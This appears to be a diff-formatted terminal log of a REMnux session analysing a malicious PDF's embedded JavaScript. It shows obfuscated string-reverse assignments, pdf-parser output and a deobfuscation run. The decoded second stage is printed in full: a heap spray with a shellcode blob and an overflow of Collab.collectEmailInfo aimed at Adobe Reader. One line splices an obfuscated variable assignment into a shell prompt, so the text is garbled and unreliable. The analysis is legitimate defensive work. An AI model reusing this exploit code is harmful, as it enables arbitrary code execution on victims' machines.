+xpqhe = wstwaxap('u%c3d');
+nhzhd = wstwaxap(')"c');
+mlpwvm = wstwaxap('1cu');
+ubjdup = wstwaxap('fDV');
+dwiyyhr = wstwaxap('Ty1W');
+sraqczaa = wstwaxap('%80c5');
+qmzdm = wstwaxap('rb ra');
+rnjnzf = wstwaxap('e6u%b');
+rlsvux = wstwaxap('av{');
+ixsksd = wstwaxap('gRDQ');
+fjqbj = wstwaxap('9yQ n');
+cnekwioq = wstwaxap('u%5');
+yrmoiuq = wstwaxap('Modfc');
+dlapr = wstwaxap('0d0u');
+pcvto = wstwaxap('iI0V');
+jjxwub = wstwaxap('%3185');
+cfftumg = wstwaxap('375u%');
+exxcnz = wstwaxap('%e3');
+crwdtlp = wstwaxap('UATt1');
+qnnjkgsw = wstwaxap('u%03');
+ohizlqu = wstwaxap('" :');
+ypfoxyv = wstwaxap('453u');
+hwnthn = wstwaxap('54u%');
+lrulyb = wstwaxap('0o0Y');
+hssgxg = wstwaxap('1u%3');
+irvakke = wstwaxap('dfc');
+smagsry = wstwaxap('333');
+yzclttv = wstwaxap('oit');
+xgjpkp = wstwaxap('1WI');
+tiltmeod = wstwaxap('u%9');
+rxrpsa = wstwaxap('WV/)');
+mnkbabxx = wstwaxap('559');
+ahkzf = wstwaxap('beu%');
+bhcvimhx = wstwaxap('e30e');
+zvygozh = wstwaxap('%0bd3');
+ygdzmlj = wstwaxap('%d3d');
+xhzju = wstwaxap('000');
+iiaojo = wstwaxap('d5au%');
+mscldb = wstwaxap('loc.');
+unxeygd = wstwaxap('cnu');
+ncmqpq = (venv) remnux@remnux:~/pdf-lab/samples$ wc -c out_s4/js_19.js 
+20291 out_s4/js_19.js
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 10 $S4
+obj 10 0
+ Type: 
+ Referencing: 
+
+  <<
+    /Fields []
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 17 $S4
+obj 17 0
+ Type: 
+ Referencing: 
+ Contains stream
+
+  <<
+    /Filter /FlateDecode
+    /Length 36
+  >>
+
+
+(venv) remnux@remnux:~/pdf-lab/samples$ nano ../deobf_s4.py
+(venv) remnux@remnux:~/pdf-lab/samples$ python3 -I ../deobf_s4.py out_s4/js_19.js out_s4/decoded
+[+] hyltlzyr(gkphk) -> eval sink, 174 chars saved to out_s4/decoded/stage1.js
+    preview: function wstwaxap(yaoduhc){yunkldoes="";while(yaoduhc.length>0){yunkldoes+=yaoduhc.charAt(yaoduhc.length-1);yaoduhc=yaoduhc.substring(0,yaoduhc.length-1);}return yunkldoes;};
+    -> 'wstwaxap' looks like a string-REVERSE helper; decoding its calls
+[+] hyltlzyr(gkphk) -> eval sink, 2043 chars saved to out_s4/decoded/stage2.js
+    preview: var DDpNVDfX = new Array();function kzV0IivL(rqYY0o0m, N1tTAUIH){while (rqYY0o0m.length*2<N1tTAUIH) {rqYY0o0m += rqYY0o0m;}rqYY0o0m = rqYY0o0m.substring(0,N1tTAUIH/2);return rqYY0o0m;}function S3GBCRN
+[=] done, 2 stage(s) extracted
+(venv) remnux@remnux:~/pdf-lab/samples$ ls -l out_s4/decoded/
+total 8
+-rw-rw-r-- 1 remnux remnux  174 Oct  7 01:26 stage1.js
+-rw-rw-r-- 1 remnux remnux 2043 Oct  7 01:26 stage2.js
+(venv) remnux@remnux:~/pdf-lab/samples$ js-beautify out_s4/decoded/stage2.js > out_s4/decoded/stage2_beautified.js
+(venv) remnux@remnux:~/pdf-lab/samples$ js-beautify out_s4/decoded/stage1.js > out_s4/decoded/stage1_beautified.js
+(venv) remnux@remnux:~/pdf-lab/samples$ js-beautify out_s4/decoded/stage1.js > out_s4/decoded/stage1_beautified.js^C
+(venv) remnux@remnux:~/pdf-lab/samples$ mv out_s4/decoded/stage1_beautified.js out_s4/decoded/stage1_pretty.js
+(venv) remnux@remnux:~/pdf-lab/samples$ mv out_s4/decoded/stage2_beautified.js out_s4/decoded/stage2_pretty.js
+(venv) remnux@remnux:~/pdf-lab/samples$ wc -c out_s4/decoded/stage2_pretty.js 
+2205 out_s4/decoded/stage2_pretty.js
+(venv) remnux@remnux:~/pdf-lab/samples$ head -c 3000 out_s4/decoded/stage2_pretty.js 
+var DDpNVDfX = new Array();
+
+function kzV0IivL(rqYY0o0m, N1tTAUIH) {
+    while (rqYY0o0m.length * 2 < N1tTAUIH) {
+        rqYY0o0m += rqYY0o0m;
+    }
+    rqYY0o0m = rqYY0o0m.substring(0, N1tTAUIH / 2);
+    return rqYY0o0m;
+}
+
+function S3GBCRNU() {
+    var ecBcfdoM = 0x0c0c0c0c;
+    var brIW1yTY = unescape("%u00e8%u0000%u5d00%uc583%ub914%u018b%u0000%u3db0%u4530%u4500%u7549%uebf9%uad00%uadad%uadad%uadad%ud4ad%u3dc1%u3d3d%u5962%u0d9c%u3d3d%u453d%ub631%u317d%u4db6%u9021%u55b6%ud635%ub634%u097d%u7db0%ub641%u0155%ucab6%u3957%ud564%u3db2%u3d3d%uc4df%u5255%u3d53%u553d%u4f48%u5051%uc269%ub62b%ud5d5%u3d44%u3d3d%ueab6%ubd7a%u3d02%uc748%u6a7a%ubd7a%u3d02%uc748%ud2b6%u0e62%ubcf4%u39d1%u3d3c%ub63d%u6ce1%u6e6f%u3955%u3d3c%uc23d%u316b%u6467%u6f6c%u3fb6%u7e6e%u06bd%u483d%ubcc7%uc146%u5813%u5845%u3e48%ud6be%ub435%ufa3e%u397e%u5813%u5845%u7efb%u3d35%ub766%u39fc%ub50d%u3d78%ufd0e%u6d6d%u6a6e%uc26d%u2d6b%uc5be%u483d%u573b%u6e3c%u6bc2%u6739%ube64%u39ff%ubd7c%u3d07%u8948%u6bc2%u6c35%ub66b%u0148%u49b6%u4513%uc83e%ub66b%u1d4b%uc83e%uf40e%u7c74%u3e90%u0ef8%u32e6%u2d83%ueb07%u3549%uf6fc%u3e30%u7de7%uccd6%u2206%uda48%ub663%u1963%ue03e%ub65b%u7631%u63b6%u3e21%ub6e0%ub639%uf83e%u6396%ufe64%uc2d5%uc2c3%ub3c2%u3373%ua5d1%ub7c3%u4333%udfe5%u0e4e%ub7f7%u0b66%u1227%u4a4d%u6c77%u3d4e%u4955%u4d49%u1207%u0412%u1309%u090f%u130a%u130f%u080c%u120a%u5113%u565e%u0212%u0055%u5c08%u3d5e%u0254%u0405%u5f0f%u0959%u580b%u0c0d%u0d0d%u0d5b%u0d0a%u0f0d%u5c59%u0e0b%u5c04%u5c04%u0b0d%u0d0d%u0d0d%u0d0d%u0d0d%u0f0d%u0c5e%u0d08%u0c0e%u0e04%u0d0d%u0c0d%u090d%u040d%u0d0d%u0d0d%u0d0d%u0d0d%u0a0c%u3d0d");
+    var VWAbzxUP = 0x400000;
+    var WCoEYFdo = brIW1yTY.length * 2;
+    var N1tTAUIH = VWAbzxUP - (WCoEYFdo + 0x38);
+    var rqYY0o0m = unescape("%u9090%u9090");
+    rqYY0o0m = kzV0IivL(rqYY0o0m, N1tTAUIH);
+    var jpwZA7Ef = (ecBcfdoM - 0x400000) / VWAbzxUP;
+    for (var xEzYibKs = 0; xEzYibKs < jpwZA7Ef; xEzYibKs++) {
+        DDpNVDfX[xEzYibKs] = rqYY0o0m + brIW1yTY;
+    }
+}
+
+function Qy9QDRgu() {
+    S3GBCRNU();
+    var YTDNPHwC = unescape("%u0c0c%u0c0c");
+    while (YTDNPHwC.length < 44952) YTDNPHwC += YTDNPHwC;
+    this.collabStore = Collab.collectEmailInfo({
+        subj: "",
+        msg: YTDNPHwC
+    });
+}
+Qy9QDRgu();(venv) remnux@remnux:~/pdf-lab/samples$ python3 ../pdf-parser.py -o 17 -f $S4
+obj 17 0
+ Type: 
+ Referencing: 
+ Contains stream
+
+  <<
+    /Filter /FlateDecode
+    /Length 36
+  >>
+
+ b'0 0 595.28000 841.89000 re W n\n'
+
+
